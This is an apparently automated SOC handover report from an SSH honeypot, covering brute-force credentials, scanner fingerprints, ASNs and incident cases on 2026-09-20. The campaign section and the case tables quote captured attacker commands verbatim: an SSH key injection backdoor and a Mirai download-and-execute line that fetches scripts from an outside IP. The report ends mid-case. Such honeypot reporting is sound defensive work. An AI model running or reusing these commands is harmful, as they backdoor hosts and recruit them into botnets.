# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-20 |
| **Generated At** | 2026-09-20T18:35:25Z |
| **Shift Time** | 18:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **201** |
| Confirmed Threats | **181** |
| False Positives Filtered | **20** (10.0%) |
| Unique Attacker IPs | **59** |
| Countries of Origin | **26** |
| High Severity Cases | **117** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **84** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **182** |
| Unique Credential Pairs | **157** |
| Unique Usernames | **47** |
| Unique Passwords | **137** |
| Successful Auth Pairs | **180** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 100 |
| `345gs5662d34` | 15 |
| `admin` | 4 |
| `ubuntu` | 4 |
| `support` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 15 |
| `1234` | 5 |
| `123456` | 5 |
| `admin` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 7 |
| `admin` | `admin` | 3 |
| `ubnt` | `1234` | 3 |
| `support` | `support` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Hello@1` | `10.0.0.73` | 2026-09-20T14:55:40 |
| `root` | `xc3511` | `186.68.83.104` | 2026-09-20T14:57:08 |
| `345gs5662d34` | `345gs5662d34` | `186.68.83.104` | 2026-09-20T14:57:10 |
| `root` | `3245gs5662d34` | `186.68.83.104` | 2026-09-20T14:57:11 |
| `root` | `Hello@12` | `10.0.0.73` | 2026-09-20T14:57:56 |
| `jahan` | `jahan` | `187.16.4.238` | 2026-09-20T15:00:06 |
| `345gs5662d34` | `345gs5662d34` | `187.16.4.238` | 2026-09-20T15:00:09 |
| `jahan` | `3245gs5662d34` | `187.16.4.238` | 2026-09-20T15:00:10 |
| `root` | `Hello@123` | `10.0.0.73` | 2026-09-20T15:00:12 |
| `admin` | `admin` | `61.146.235.54` | 2026-09-20T15:00:51 |
| `root` | `Hello!2016` | `10.0.0.73` | 2026-09-20T15:02:24 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-20T15:03:58 |
| `root` | `Hello!2017` | `10.0.0.73` | 2026-09-20T15:04:37 |
| `root` | `Hello@2016` | `10.0.0.73` | 2026-09-20T15:06:50 |
| `root` | `Hello@2017` | `10.0.0.73` | 2026-09-20T15:09:00 |
| `service` | `service` | `10.0.0.73` | 2026-09-20T15:10:59 |
| `root` | `Hello.1` | `10.0.0.73` | 2026-09-20T15:11:12 |
| `root` | `Hello.12` | `10.0.0.73` | 2026-09-20T15:13:27 |
| `root` | `Hello.123` | `10.0.0.73` | 2026-09-20T15:15:49 |
| `root` | `Hello.1234` | `10.0.0.73` | 2026-09-20T15:18:01 |
| `root` | `Hello.2016` | `10.0.0.73` | 2026-09-20T15:20:12 |
| `root` | `Hello.2017` | `10.0.0.73` | 2026-09-20T15:22:26 |
| `root` | `------fuck------` | `212.28.184.195` | 2026-09-20T15:24:16 |
| `root` | `Hello!@#` | `10.0.0.73` | 2026-09-20T15:24:38 |
| `root` | `gw2k` | `10.0.0.73` | 2026-09-20T15:26:54 |
| `root` | `Gs123258` | `10.0.0.73` | 2026-09-20T15:29:06 |
| `root` | `Global123` | `10.0.0.73` | 2026-09-20T15:31:20 |
| `backuppc` | `12345678` | `43.245.248.2` | 2026-09-20T15:31:30 |
| `345gs5662d34` | `345gs5662d34` | `43.245.248.2` | 2026-09-20T15:31:34 |
| `backuppc` | `3245gs5662d34` | `43.245.248.2` | 2026-09-20T15:31:36 |
| `root` | `ger123` | `10.0.0.73` | 2026-09-20T15:33:34 |
| `root` | `@dmin1234` | `10.0.0.73` | 2026-09-20T15:35:42 |
| `webmin` | `webmin` | `10.0.0.73` | 2026-09-20T15:36:44 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-20T15:36:46 |
| `webmin` | `3245gs5662d34` | `10.0.0.73` | 2026-09-20T15:36:47 |
| `root` | `123.abc` | `106.75.222.86` | 2026-09-20T15:37:37 |
| `root` | `dell123` | `10.0.0.73` | 2026-09-20T15:38:00 |
| `ubnt` | `1234` | `77.90.185.17` | 2026-09-20T15:38:50 |
| `root` | `asdf1234` | `10.0.0.73` | 2026-09-20T15:40:09 |
| `ubnt` | `1234` | `10.0.0.73` | 2026-09-20T15:41:27 |
| `root` | `` | `94.154.43.69` | 2026-09-20T15:41:27 |
| `root` | `123456789` | `172.210.53.194` | 2026-09-20T15:41:48 |
| `root` | `asd13` | `10.0.0.73` | 2026-09-20T15:42:21 |
| `root` | `asd123..` | `10.0.0.73` | 2026-09-20T15:46:49 |
| `ubnt` | `1234` | `80.94.95.118` | 2026-09-20T15:46:58 |
| `root` | `as123456` | `10.0.0.73` | 2026-09-20T15:49:01 |
| `root` | `Afaqy@123` | `10.0.0.73` | 2026-09-20T15:51:14 |
| `root` | `adminpass` | `10.0.0.73` | 2026-09-20T15:53:27 |
| `root` | `Admin_2016` | `10.0.0.73` | 2026-09-20T15:55:41 |
| `root` | `ADmin123` | `10.0.0.73` | 2026-09-20T15:57:50 |
| `ubuntu` | `0987654321` | `10.0.0.73` | 2026-09-20T15:58:34 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-09-20T15:58:36 |
| `root` | `admin@12` | `10.0.0.73` | 2026-09-20T16:00:03 |
| `root` | `Admin1!` | `10.0.0.73` | 2026-09-20T16:02:15 |
| `root` | `adm` | `10.0.0.73` | 2026-09-20T16:04:36 |
| `root` | `ABCdef123` | `10.0.0.73` | 2026-09-20T16:06:51 |
| `root` | `Abcd!234` | `10.0.0.73` | 2026-09-20T16:09:12 |
| `support` | `support` | `10.0.0.73` | 2026-09-20T16:09:29 |
| `root` | `Abcd1234!` | `10.0.0.73` | 2026-09-20T16:11:19 |
| `root` | `abcd@123` | `10.0.0.73` | 2026-09-20T16:13:30 |
| `root` | `abcABC123!@#` | `10.0.0.73` | 2026-09-20T16:15:45 |
| `root` | `Abc123654789` | `10.0.0.73` | 2026-09-20T16:17:59 |
| `root` | `Aa123123` | `10.0.0.73` | 2026-09-20T16:20:10 |
| `root` | `a1234@` | `10.0.0.73` | 2026-09-20T16:22:25 |
| `root` | `5tgbNJI)` | `10.0.0.73` | 2026-09-20T16:24:37 |
| `root` | `3edcVGY/` | `10.0.0.73` | 2026-09-20T16:26:48 |
| `root` | `2wsx@WSX` | `10.0.0.73` | 2026-09-20T16:29:00 |
| `support` | `support2023` | `10.0.0.73` | 2026-09-20T16:30:40 |
| `support` | `3245gs5662d34` | `10.0.0.73` | 2026-09-20T16:30:46 |
| `root` | `2wsxCFT&` | `10.0.0.73` | 2026-09-20T16:31:10 |
| `root` | `cloud` | `172.210.53.194` | 2026-09-20T16:33:06 |
| `root` | `24iyniC@tty#12` | `10.0.0.73` | 2026-09-20T16:33:26 |
| `root` | `---fuck_you----` | `140.99.83.52` | 2026-09-20T16:35:07 |
| `root` | `1qaz@WSX3edc$RFV` | `10.0.0.73` | 2026-09-20T16:35:32 |
| `root` | `1234qwer!@#$` | `187.154.98.53` | 2026-09-20T16:37:10 |
| `345gs5662d34` | `345gs5662d34` | `187.154.98.53` | 2026-09-20T16:37:12 |
| `root` | `3245gs5662d34` | `187.154.98.53` | 2026-09-20T16:37:13 |
| `vhserver` | `vhserver123` | `49.72.212.22` | 2026-09-20T16:37:34 |
| `345gs5662d34` | `345gs5662d34` | `49.72.212.22` | 2026-09-20T16:37:38 |
| `vhserver` | `3245gs5662d34` | `49.72.212.22` | 2026-09-20T16:37:40 |
| `root` | `1qaz` | `10.0.0.73` | 2026-09-20T16:37:42 |
| `root` | `Fh123456` | `103.172.20.218` | 2026-09-20T16:38:21 |
| `345gs5662d34` | `345gs5662d34` | `103.172.20.218` | 2026-09-20T16:38:25 |
| `root` | `3245gs5662d34` | `103.172.20.218` | 2026-09-20T16:38:27 |
| `debian` | `admin123` | `200.175.61.207` | 2026-09-20T16:38:53 |
| `345gs5662d34` | `345gs5662d34` | `200.175.61.207` | 2026-09-20T16:38:56 |
| `debian` | `3245gs5662d34` | `200.175.61.207` | 2026-09-20T16:38:57 |
| `root` | `1Q2w3e4r` | `10.0.0.73` | 2026-09-20T16:39:54 |
| `root` | `tianhu@123` | `146.199.17.126` | 2026-09-20T16:40:33 |
| `345gs5662d34` | `345gs5662d34` | `146.199.17.126` | 2026-09-20T16:40:36 |
| `root` | `3245gs5662d34` | `146.199.17.126` | 2026-09-20T16:40:36 |
| `root` | `fan123456` | `57.129.120.143` | 2026-09-20T16:40:40 |
| `345gs5662d34` | `345gs5662d34` | `57.129.120.143` | 2026-09-20T16:40:42 |
| `root` | `3245gs5662d34` | `57.129.120.143` | 2026-09-20T16:40:43 |
| `root` | `000111` | `103.183.75.92` | 2026-09-20T16:41:37 |
| `345gs5662d34` | `345gs5662d34` | `103.183.75.92` | 2026-09-20T16:41:41 |
| `root` | `3245gs5662d34` | `103.183.75.92` | 2026-09-20T16:41:43 |
| `root` | `1q2w3e4r$` | `10.0.0.73` | 2026-09-20T16:42:04 |
| `root` | `a123456@` | `10.0.0.73` | 2026-09-20T16:42:11 |
| `info` | `1234567890` | `183.88.232.183` | 2026-09-20T16:42:42 |
| `345gs5662d34` | `345gs5662d34` | `183.88.232.183` | 2026-09-20T16:42:46 |
| `info` | `3245gs5662d34` | `183.88.232.183` | 2026-09-20T16:42:48 |
| `root` | `1q2w3e1q2w3e` | `10.0.0.73` | 2026-09-20T16:44:14 |
| `root` | `zw@123456` | `203.145.35.27` | 2026-09-20T16:45:54 |
| `345gs5662d34` | `345gs5662d34` | `203.145.35.27` | 2026-09-20T16:45:58 |
| `root` | `3245gs5662d34` | `203.145.35.27` | 2026-09-20T16:46:00 |
| `root` | `1Password` | `10.0.0.73` | 2026-09-20T16:46:32 |
| `root` | `12qwaszx` | `10.0.0.73` | 2026-09-20T16:48:44 |
| `guest` | `guest` | `109.160.32.61` | 2026-09-20T16:48:50 |
| `clawdbot` | `clawdbot` | `109.160.32.61` | 2026-09-20T16:48:55 |
| `zy` | `zy` | `109.160.32.61` | 2026-09-20T16:49:01 |
| `root` | `nD6ffS9msOngs` | `109.160.32.61` | 2026-09-20T16:49:07 |
| `test` | `test@123` | `109.160.32.61` | 2026-09-20T16:49:12 |
| `user` | `1111` | `109.160.32.61` | 2026-09-20T16:49:18 |
| `root` | `123456qq@` | `109.160.32.61` | 2026-09-20T16:49:23 |
| `user` | `git` | `109.160.32.61` | 2026-09-20T16:49:29 |
| `zyang` | `zyang` | `109.160.32.61` | 2026-09-20T16:49:34 |
| `oracle` | `passw0rd` | `109.160.32.61` | 2026-09-20T16:49:39 |
| `root` | `123abc456` | `109.160.32.61` | 2026-09-20T16:49:45 |
| `normal` | `normal` | `109.160.32.61` | 2026-09-20T16:49:51 |
| `trader` | `123456` | `109.160.32.61` | 2026-09-20T16:49:56 |
| `root` | `Yun@wocloud.szkj` | `109.160.32.61` | 2026-09-20T16:50:02 |
| `root` | `Qwert@123456` | `109.160.32.61` | 2026-09-20T16:50:07 |
| `admin` | `admin` | `109.160.32.61` | 2026-09-20T16:50:12 |
| `root` | `A1234567890` | `109.160.32.61` | 2026-09-20T16:50:18 |
| `ubuntu` | `admin` | `109.160.32.61` | 2026-09-20T16:50:23 |
| `support` | `support` | `176.53.159.196` | 2026-09-20T16:50:28 |
| `frappe` | `123` | `109.160.32.61` | 2026-09-20T16:50:29 |
| `ranga` | `ranga` | `109.160.32.61` | 2026-09-20T16:50:34 |
| `rock` | `rock` | `109.160.32.61` | 2026-09-20T16:50:40 |
| `deploy` | `rootroot` | `109.160.32.61` | 2026-09-20T16:50:46 |
| `rocky` | `1234` | `109.160.32.61` | 2026-09-20T16:50:51 |
| `grid` | `grid` | `109.160.32.61` | 2026-09-20T16:50:57 |
| `root` | `tyuiop` | `109.160.32.61` | 2026-09-20T16:51:02 |
| `user` | `user123456` | `109.160.32.61` | 2026-09-20T16:51:08 |
| `default` | `default` | `109.160.32.61` | 2026-09-20T16:51:12 |
| `root` | `root!@` | `109.160.32.61` | 2026-09-20T16:51:17 |
| `root` | `1234ab` | `109.160.32.61` | 2026-09-20T16:51:22 |
| `root` | `MAGICROOTPASSWORD` | `109.160.32.61` | 2026-09-20T16:51:27 |
| `ubuntu` | `123` | `109.160.32.61` | 2026-09-20T16:51:33 |
| `pi` | `123456` | `109.160.32.61` | 2026-09-20T16:51:38 |
| `root` | `Aa123456@` | `109.160.32.61` | 2026-09-20T16:51:43 |
| `admin` | `abc123` | `109.160.32.61` | 2026-09-20T16:51:49 |
| `developer` | `developer` | `109.160.32.61` | 2026-09-20T16:51:54 |
| `root` | `moon123` | `109.160.32.61` | 2026-09-20T16:51:59 |
| `root` | `0104` | `109.160.32.61` | 2026-09-20T16:52:05 |
| `trader` | `1234` | `109.160.32.61` | 2026-09-20T16:52:10 |
| `root` | `AhaNode123` | `109.160.32.61` | 2026-09-20T16:52:15 |
| `user18` | `user18` | `109.160.32.61` | 2026-09-20T16:52:21 |
| `rahul` | `123456` | `109.160.32.61` | 2026-09-20T16:52:26 |
| `splunk` | `password` | `109.160.32.61` | 2026-09-20T16:52:31 |
| `app` | `root` | `109.160.32.61` | 2026-09-20T16:52:37 |
| `pi` | `root` | `109.160.32.61` | 2026-09-20T16:52:42 |
| `root` | `QAZWSXED` | `109.160.32.61` | 2026-09-20T16:52:48 |
| `root` | `Qq123456` | `109.160.32.61` | 2026-09-20T16:52:53 |
| `coder` | `123456` | `109.160.32.61` | 2026-09-20T16:52:58 |
| `root` | `Qq@123123` | `109.160.32.61` | 2026-09-20T16:53:03 |
| `server` | `123456` | `109.160.32.61` | 2026-09-20T16:53:09 |
| `root` | `123qwe,./` | `10.0.0.73` | 2026-09-20T16:53:12 |
| `root` | `c` | `109.160.32.61` | 2026-09-20T16:53:14 |
| `es` | `es123456` | `109.160.32.61` | 2026-09-20T16:53:19 |
| `root` | `123123` | `109.160.32.61` | 2026-09-20T16:53:25 |
| `sam` | `123456789` | `109.160.32.61` | 2026-09-20T16:53:30 |
| `root` | `1q2w3e` | `109.160.32.61` | 2026-09-20T16:53:35 |
| `root` | `Aa1234567890` | `109.160.32.61` | 2026-09-20T16:53:41 |
| `openvpn` | `openvpn` | `109.160.32.61` | 2026-09-20T16:53:45 |
| `cheryl` | `cheryl` | `109.160.32.61` | 2026-09-20T16:53:51 |
| `root` | `12345123` | `109.160.32.61` | 2026-09-20T16:53:57 |
| `deploy` | `123123` | `109.160.32.61` | 2026-09-20T16:54:02 |
| `orange` | `orange` | `109.160.32.61` | 2026-09-20T16:54:07 |
| `kafka` | `kafka` | `109.160.32.61` | 2026-09-20T16:54:12 |
| `root` | `Aa112233` | `109.160.32.61` | 2026-09-20T16:54:18 |
| `root` | `ssssssss` | `109.160.32.61` | 2026-09-20T16:54:24 |
| `root` | `cupcake` | `109.160.32.61` | 2026-09-20T16:54:28 |
| `claude` | `abc123` | `109.160.32.61` | 2026-09-20T16:54:34 |
| `factorio` | `factorio` | `109.160.32.61` | 2026-09-20T16:54:39 |
| `root` | `124` | `109.160.32.61` | 2026-09-20T16:54:44 |
| `ftpuser` | `ftpuser` | `109.160.32.61` | 2026-09-20T16:54:50 |
| `dspace` | `dspace` | `109.160.32.61` | 2026-09-20T16:54:55 |
| `root` | `bash` | `109.160.32.61` | 2026-09-20T16:55:00 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **201** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 79 |
| libssh | 40 |
| OpenSSH | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 70 | 1 |
| `f555226df196...` | Mirai/variant | 36 | 14 |
| `16443846184e...` | Generic scanner | 3 | 2 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 70 | 1 | Generic scanner |
| `f555226df196...` | libssh | 36 | 14 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 3 | 2 | Generic scanner |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `390ffe68a68c...` | OpenSSH | 2 | 2 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 12 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `183.88.232.183`, `57.129.120.143`, `186.68.83.104`, `43.245.248.2`, `203.145.35.27`, `103.183.75.92`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/handshakebins.sh; busybox wget http://213.232.114.14/handshakebins.sh; curl -o handshakebins.sh http://213.232.114.14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114.14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114.14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *
```
Source IPs: `94.154.43.69`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **59** |
| Unique ASNs | **40** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 15 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS14987` | Rethem Hosting LLC | 2 | HIGH |
| `AS8151` | Uninet S.A. de C.V. | 2 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 2 | MEDIUM |
| `AS396982` | Google LLC | 2 | LOW |
| `AS17072` | TOTAL PLAY TELECOMUNICACIONES, S.A.P.I. DE C.V. | 1 | LOW |
| `AS45758` | Advanced Wireless Network Company Limited | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (117)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-30162807aaeb

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-09-20 14:57 |
| **Last Seen** | 2026-09-20 14:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 14:57:08` | `cowrie.session.connect` |
| `2026-09-20 14:57:08` | `cowrie.client.version` |
| `2026-09-20 14:57:08` | `cowrie.client.kex` |
| `2026-09-20 14:57:08` | `cowrie.login.success` |
| `2026-09-20 14:57:09` | `cowrie.session.params` |
| `2026-09-20 14:57:09` | `cowrie.command.input` |
| `2026-09-20 14:57:09` | `cowrie.command.failed` |
| `2026-09-20 14:57:09` | `cowrie.log.closed` |
| `2026-09-20 14:57:10` | `cowrie.session.params` |
| `2026-09-20 14:57:10` | `cowrie.command.input` |
| `2026-09-20 14:57:10` | `cowrie.session.file_download` |
| `2026-09-20 14:57:10` | `cowrie.log.closed` |
| `2026-09-20 14:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-103294b5917d

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-09-20 14:57 |
| **Last Seen** | 2026-09-20 14:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 14:57:10` | `cowrie.session.connect` |
| `2026-09-20 14:57:10` | `cowrie.client.version` |
| `2026-09-20 14:57:10` | `cowrie.client.kex` |
| `2026-09-20 14:57:10` | `cowrie.login.success` |
| `2026-09-20 14:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0573f95b246

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-09-20 14:57 |
| **Last Seen** | 2026-09-20 14:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 14:57:11` | `cowrie.session.connect` |
| `2026-09-20 14:57:11` | `cowrie.client.version` |
| `2026-09-20 14:57:11` | `cowrie.client.kex` |
| `2026-09-20 14:57:11` | `cowrie.login.success` |
| `2026-09-20 14:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510f85c0c8ab

| Field | Detail |
|---|---|
| **Source IP** | `187.16.4[.]238` |
| **First Seen** | 2026-09-20 15:00 |
| **Last Seen** | 2026-09-20 15:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:00:05` | `cowrie.session.connect` |
| `2026-09-20 15:00:05` | `cowrie.client.version` |
| `2026-09-20 15:00:06` | `cowrie.client.kex` |
| `2026-09-20 15:00:06` | `cowrie.login.success` |
| `2026-09-20 15:00:07` | `cowrie.session.params` |
| `2026-09-20 15:00:07` | `cowrie.command.input` |
| `2026-09-20 15:00:07` | `cowrie.command.failed` |
| `2026-09-20 15:00:07` | `cowrie.log.closed` |
| `2026-09-20 15:00:08` | `cowrie.session.params` |
| `2026-09-20 15:00:08` | `cowrie.command.input` |
| `2026-09-20 15:00:08` | `cowrie.session.file_download` |
| `2026-09-20 15:00:08` | `cowrie.log.closed` |
| `2026-09-20 15:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.16.4[.]238` to AbuseIPDB if not already reported
- [ ] Block `187.16.4[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22e250f26d87

| Field | Detail |
|---|---|
| **Source IP** | `187.16.4[.]238` |
| **First Seen** | 2026-09-20 15:00 |
| **Last Seen** | 2026-09-20 15:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:00:08` | `cowrie.session.connect` |
| `2026-09-20 15:00:08` | `cowrie.client.version` |
| `2026-09-20 15:00:08` | `cowrie.client.kex` |
| `2026-09-20 15:00:09` | `cowrie.login.success` |
| `2026-09-20 15:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.16.4[.]238` to AbuseIPDB if not already reported
- [ ] Block `187.16.4[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-200ec8cf1930

| Field | Detail |
|---|---|
| **Source IP** | `187.16.4[.]238` |
| **First Seen** | 2026-09-20 15:00 |
| **Last Seen** | 2026-09-20 15:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:00:09` | `cowrie.session.connect` |
| `2026-09-20 15:00:09` | `cowrie.client.version` |
| `2026-09-20 15:00:09` | `cowrie.client.kex` |
| `2026-09-20 15:00:10` | `cowrie.login.success` |
| `2026-09-20 15:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.16.4[.]238` to AbuseIPDB if not already reported
- [ ] Block `187.16.4[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14f60b8ecb19

| Field | Detail |
|---|---|
| **Source IP** | `61.146.235[.]54` |
| **First Seen** | 2026-09-20 15:00 |
| **Last Seen** | 2026-09-20 15:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:00:50` | `cowrie.session.connect` |
